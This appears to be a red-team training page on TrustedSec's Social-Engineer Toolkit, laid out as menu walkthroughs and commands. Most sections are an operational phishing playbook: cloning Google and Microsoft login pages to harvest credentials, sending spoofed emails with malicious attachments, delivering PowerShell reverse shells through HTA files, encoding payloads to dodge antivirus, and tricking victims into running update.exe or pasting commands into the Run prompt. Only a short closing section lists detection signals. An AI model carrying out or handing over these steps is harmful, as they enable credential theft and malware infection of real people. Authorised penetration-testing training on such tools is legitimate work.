---
layout: training-page
title: "Social-Engineer Toolkit (SET) — Red Team Academy"
module: "Web Hacking"
tags:
  - set
  - social-engineering
  - phishing
  - credential-harvesting
  - spear-phishing
  - payload-delivery
  - web-hacking
page_key: "web-set"
render_with_liquid: false
---

# Social-Engineer Toolkit (SET)

SET is TrustedSec's open-source social engineering framework. It provides a menu-driven interface for building and delivering social engineering attacks: spear-phishing emails with malicious attachments, credential harvesting via cloned websites, HTA-based PowerShell delivery, QR code phishing, and more. SET automates the interaction between social engineering pretexts and Metasploit-generated payloads, making it a complete campaign-delivery platform.

## Install

```
# Kali Linux (already packaged):
sudo apt install set -y
setoolkit

# From source (any Debian-based Linux):
git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
cd setoolkit
pip3 install -r requirements.txt
sudo python3 setup.py
sudo setoolkit

# macOS (M2 — use venv):
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
sudo python3 setup.py
```

## Menu Navigation

```
# SET launches an interactive TUI — no CLI flags for most operations.
# Main menu (run as root):
sudo setoolkit

# Top-level menu:
#   1) Social-Engineering Attacks       ← where all phishing/delivery lives
#   2) Penetration Testing (Fast-Track) ← MSSQL bruter, PSEXEC injection
#   3) Third Party Modules
#   4) Update SET
#   5) Update SET configuration
#   6) Help, Credits, and About

# Social-Engineering Attacks menu (option 1):
#   1) Spear-Phishing Attack Vectors
#   2) Website Attack Vectors
#   3) Infectious Media Generator
#   4) Create a Payload and Listener
#   5) Mass Mailer Attack
#   6) Arduino-Based Attack Vector
#   7) Wireless Access Point Attack Vector
#   8) QRCode Generator Attack Vector
#   9) Powershell Attack Vectors
#  10) Third Party Modules

# Navigate: type the number and press Enter.
# Return to main menu: type 99 at any sub-menu.
```

## Spear-Phishing — Email with Malicious Attachment

SET sends a crafted email to one or more targets with a Metasploit-generated payload embedded in a document (PDF, XLS, DOC, etc.). The target opens the attachment, the payload executes, and a Meterpreter session opens.

```
# Prerequisites:
sudo apt install sendmail -y
# Edit /etc/setoolkit/set.config and set SENDMAIL=ON

# Navigate: 1 → 1 (Spear-Phishing → Perform a Mass Email Attack)

# SET will prompt interactively:
# Email the victim? [yes/no]: yes
# 1. Use a Gmail Account for your email attack.
# 2. Use your own server or open relay
# → Choose 1 for Gmail, enter credentials when prompted
# → Choose 2 to specify your SMTP server / relay

# Payload selection (common choices):
# 1) SET Custom Written DLL Hijacking Attack Vector
# 2) SET Custom Written VBA Macro Attack Vector (Word/Excel)
# ...
# 14) Adobe PDF Embedded EXE Social Engineering

# File format payloads available:
# 1) Adobe Reader v8 and v9 CoolType exploit
# 2) Adobe Flash Player 'Button' Remote Code Execution
# 3) MS08-067 Microsoft Server Service Relative Path Stack Corruption
# 4) MSOffice-Word RTF pFragments Stack Buffer Overflow
# 5) MSOffice-Word 2003 Malicious Word
# 6) Adobe CoolType Overflow in TTF Files
# 7) MSWord-RTF Object Confusion
# 8) Custom EXE to VBA (Marco AV Bypass Macro Attachment — works well)

# Listener: SET can auto-launch Metasploit handler
# Enter your IP address for the payload listener [auto detected]: 10.10.14.5
# Enter the port for the reverse connection: 4444

# Mass email — load from file:
# Do you want to send the message to multiple addresses? [yes/no]: yes
# Path to file: /path/to/emails.txt (one address per line)
```

## Website Attack Vectors — Credential Harvesting

SET clones any website, replaces form action targets to point at a local capture server, then harvests all credentials submitted. When the victim submits, they are transparently redirected to the real site, and the credentials appear in SET's log.

```
# Navigate: 1 → 2 → 3 (Website Attacks → Credential Harvester)
# Then: 2) Site Cloner

# SET prompts:
# IP address for the POST back in Harvester/Tabnabbing: 10.10.14.5
# Enter the url to clone: https://accounts.google.com/

# SET clones the site and starts a webserver on port 80.
# Send victims to: http://10.10.14.5/

# SET captures credentials and logs to:
# /var/log/setoolkit/harvester_*.log
# Screen output shows: [*] We got a POST from 192.168.1.50!
#                      POST field: username = victim@gmail.com
#                      POST field: password = hunter2

# Clone OWA / O365:
# Enter the url to clone: https://login.microsoftonline.com/

# For custom ports (if port 80 blocked):
# Edit /etc/setoolkit/set.config:
# HTTP_PORT=8080

# Tabnabbing attack (option 4 in web attack menu):
# Serves a legitimate-looking page. When victim switches browser tabs,
# the page silently replaces itself with a login form.
# Victims return and enter credentials thinking they were already logged in.
```

## HTA Attack — PowerShell via Browser

SET serves an HTA file from a cloned webpage. When the victim downloads and opens the HTA, Windows Script Host executes embedded PowerShell that downloads and runs a Meterpreter payload. Bypasses most browser-delivered payload restrictions.

```
# Navigate: 1 → 2 → 7 (Website Attacks → HTA Attack Method)

# SET prompts:
# IP address for the payload listener: 10.10.14.5
# Enter the URL to clone: https://intranet.corp.local/portal/

# SET generates:
# - Cloned webpage with embedded HTA download link
# - PowerShell payload that connects back to your listener
# - Auto-starts Metasploit listener

# What the victim sees:
# 1. Receives phishing link to http://10.10.14.5/
# 2. Page loads (looks legitimate)
# 3. Browser downloads file.hta (prompted to open)
# 4. Victim clicks Run → PowerShell executes → shell

# Detection note:
# HTA execution generates: WScript.exe → powershell.exe
# Parent-child chain is a reliable EDR detection signal.
# Consider encoding the PS payload to reduce static AV detection.
```

## PowerShell Attack Vectors

Generates standalone PowerShell payloads for delivery via email, USB, or social engineering. No Metasploit required — payloads use pure PowerShell shellcode injection.

```
# Navigate: 1 → 9 (Social-Engineering → Powershell Attack Vectors)

# Sub-menu:
# 1) PowerShell Alphanumeric Shellcode Injector
# 2) PowerShell Reverse Shell
# 3) PowerShell Bind Shell
# 4) PowerShell Dump SAM Database

# Option 1 — Alphanumeric injector (most useful for AV bypass):
# Enter the IP address for the reverse shell: 10.10.14.5
# Enter the port: 443
# SET generates: x86_64 alphanumeric shellcode + PS one-liner
# Output location: /root/.set/reports/powershell.ps1

# Option 4 — SAM database dump (local privilege required):
# Generates PS script that exports HKLM\SAM and SYSTEM hive
# Useful for post-exploitation without running Mimikatz binary

# Delivery example (embed in phishing email body):
# powershell -ExecutionPolicy Bypass -WindowStyle Hidden -enc [BASE64]

# The generated encoded command can be delivered via:
# - Phishing email body (tell victim to paste into Run prompt)
# - Macro: Shell("powershell -enc [BASE64]")
# - LNK shortcut target field
```

## Create a Payload and Listener

Generates a standalone executable payload with an auto-started Metasploit handler. Useful when you want a Windows EXE to send via spear-phish or host on a web server.

```
# Navigate: 1 → 4 (Create a Payload and Listener)

# Sub-menu shows payload types:
# 1) Windows Shell Reverse_TCP (Meterpreter)
# 2) Windows Reverse_TCP Meterpreter
# 3) Windows Reverse_TCP Shell (cmd.exe)
# 4) Windows Bind Shell
# 5) Windows Bind Shell X64
# 6) Windows Shell Reverse_TCP X64
# 7) Windows Meterpreter Reverse_TCP X64
# 8) Windows Meterpreter Egress Buster (tries multiple ports)
# 9) Windows Meterpreter Reverse HTTPS

# SET prompts:
# IP address for the payload listener: 10.10.14.5
# Port for the reverse: 443
# Filename for the payload: update.exe

# Output: /root/.set/update.exe
# Metasploit handler: auto-started, listening on 443

# After generation, serve the payload:
python3 -m http.server 8080    # victim downloads from http://10.10.14.5:8080/update.exe

# Combine with credential harvester:
# When victim clicks phishing link:
# 1. Browser opens cloned site → creds harvested
# 2. Page auto-redirects to payload download
# 3. Victim runs update.exe → Meterpreter session
```

## QR Code Phishing

Generates a QR code that encodes any URL — typically a credential harvester or payload download. Effective against phone-based targets and QR code awareness gaps.

```
# Navigate: 1 → 8 (QRCode Generator)

# SET prompts:
# Enter the URL you want the QRCode to go to: http://10.10.14.5/
# Output: /root/.set/qrcode_attack.png

# Use the QR code in:
# - Phishing emails (embed the PNG)
# - Printed fake posters / lobby notices ("Free WiFi — scan to connect")
# - Fake conference badge lanyards
# - Vishing follow-up: "I just sent you a QR code to verify your account"

# The URL should point to:
# - SET credential harvester (already running)
# - GoPhish tracking link with redirect to real login page
# - Direct payload download (if target is mobile, consider iOS/Android payload)
```

## Mass Mailer Attack

Sends phishing emails to a list of targets without a malicious attachment — just a crafted social engineering message with a link. Useful for credential harvester campaigns or purely text-based pretexts.

```
# Navigate: 1 → 5 (Mass Mailer Attack)

# Sub-menu:
# 1) E-Mail Attack Single Email Address
# 2) E-Mail Attack Mass Mailer

# Single email (test / spear-phish one target):
# Flag name (to spoof From): IT Support
# Flag email (spoofed From address): it-support@corp.example.com
# Sending to (victim): victim@corp.example.com
# Subject: Your password is expiring in 24 hours
# Body: Hi {name}, click here to update: http://10.10.14.5/

# Mass mailer (bulk):
# Path to email list file: /root/targets.txt   (one email per line)
# SET sends to each address with same template

# Prerequisite for spoofing:
# SENDMAIL=ON in /etc/setoolkit/set.config
# OR use an SMTP relay that allows envelope-from spoofing
# Check target domain: spoofcheck.py corp.example.com
```

## Output and Logs

```
# SET stores all output in:
ls /root/.set/reports/

# Credential harvester captures:
cat /root/.set/reports/harvester_*.log    # or /var/log/setoolkit/

# Generated payloads:
ls /root/.set/

# Metasploit RC files (auto-generated for handlers):
cat /root/.set/meta_config

# To run the handler separately (without SET's auto-start):
msfconsole -r /root/.set/meta_config
```

## Detection Signals

```
# Network:
# - HTTP POST to an unexpected server with credential parameter names
# - HTA file download (Content-Type: application/hta)
# - Outbound reverse shell TCP on non-standard ports from browser process

# Host:
# - mshta.exe spawning PowerShell (HTA attack)
# - setoolkit process (python3) acting as HTTP server on port 80/443
# - Cloned site in /tmp/index.html (SET's web root)

# Email:
# - From/Reply-To header mismatch (spoofed sender)
# - SPF softfail or DMARC none on sending domain
# - Attachment with dual extension (invoice.pdf.exe)
```

## Resources

- Social-Engineer Toolkit — `github.com/trustedsec/social-engineer-toolkit`
- SET User Manual (PDF) — `github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User_Manual.pdf`
- TrustedSec — `trustedsec.com`
- Related: [Phishing Campaign Methodology](/reporting/phishing-campaign/)
- Related: [Evilginx AiTM Framework](/c2-frameworks/evilginx/)
- Related: [GoPhish Phishing Framework](/c2-frameworks/gophish/)
